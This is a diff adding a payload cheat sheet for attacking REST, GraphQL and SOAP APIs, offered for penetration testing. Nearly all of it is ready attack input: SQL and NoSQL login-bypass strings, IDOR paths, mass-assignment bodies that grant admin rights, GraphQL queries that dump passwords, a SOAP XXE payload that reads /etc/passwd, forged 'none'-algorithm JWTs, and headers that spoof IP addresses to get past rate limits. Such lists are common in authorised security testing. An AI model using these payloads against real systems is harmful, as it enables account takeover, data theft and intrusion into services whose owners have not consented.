@@ -1,0 +1,167 @@
+# ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# API Testing Payloads - REST, GraphQL, SOAP
+# ============================================
+
+## REST API Common Endpoints
+/api/v1/users
+/api/v1/users/1
+/api/v1/admin
+/api/v1/config
+/api/internal/users
+/api/debug
+/api/health
+/api/status
+/api/docs
+/api/swagger.json
+/api/openapi.json
+
+## REST API Test Payloads
+### Authentication Bypass
+{"username": "admin", "password": "' OR '1'='1"}
+{"username": "admin'--", "password": "anything"}
+{"username": "admin", "password": {"$ne": null}}
+{"token": "null", "user": "admin"}
+Bearer null
+Bearer undefined
+Bearer <empty>
+
+### IDOR Testing
+/v1/users/1
+/v1/users/0
+/v1/users/-1
+/v1/users/999999
+/v1/users/1/profile
+/v1/admin/users
+/v1/internal/config
+
+### Mass Assignment
+{"id": 1, "username": "admin", "role": "admin", "isAdmin": true}
+{"id": 1, "is_admin": true, "role": "administrator"}
+{"user_id": 1, "password": "newpassword", "email": "attacker@evil.com"}
+
+## GraphQL Introspection Queries
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+
+query {
+  __type(name: "Query") {
+    name
+    fields {
+      name
+      type {
+        name
+      }
+    }
+  }
+}
+
+## GraphQL Injection
+{"query": "{users(limit: 100) {id username password email}}"}
+{"query": "{user(username: \"admin\") {password}}"}
+{"query": "mutation {login(username: \"admin\", password: \"admin\") {token}}"}
+{"query": "mutation {deleteUser(id: 1) {id}}"}
+{"query": "{__schema{types{name,fields{name,type{name}}}}}}"}
+
+## GraphQL Batching Attack
+[
+  {"query": "{login(username: \"admin\", password: \"admin\") {token}}"},
+  {"query": "{user(id: 1) {password}}"},
+  {"query": "{users {password}}"}
+]
+
+## GraphQL Alias Overloading
+query {
+  a1: users {id}
+  a2: users {id}
+  a3: users {id}
+  a4: users {id}
+  a5: users {id}
+}
+
+## SOAP XML Injection
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <login>
+      <username>admin' OR '1'='1</username>
+      <password>anything</password>
+    </login>
+  </soap:Body>
+</soap:Envelope>
+
+## SOAP XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope>
+  <soap:Body>
+    <query>&xxe;</query>
+  </soap:Body>
+</soap:Envelope>
+
+## API Key Testing
+X-Api-Key: test
+X-Api-Key: admin
+X-Api-Key: null
+X-Api-Key: undefined
+X-API-Key: 
+Authorization: ApiKey test
+Authorization: Bearer test
+Authorization: Basic YWRtaW46YWRtaW4=
+
+## JWT Token Testing
+### Weak Secrets
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.secret
+### None Algorithm
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+### Algorithm Confusion
+
+## Rate Limiting Bypass
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwarded-Server: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+
+## Content-Type Testing
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: text/xml
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+
+## HTTP Method Testing
+GET /api/users/1
+POST /api/users/1
+PUT /api/users/1
+PATCH /api/users/1
+DELETE /api/users/1
+OPTIONS /api/users/1
+TRACE /api/users/1
+
+## API Version Testing
+/api/v1/users
+/api/v2/users
+/api/users
+/v1/users
+/v2/users
+/api/v1.0/users
+/api/v1.1/users
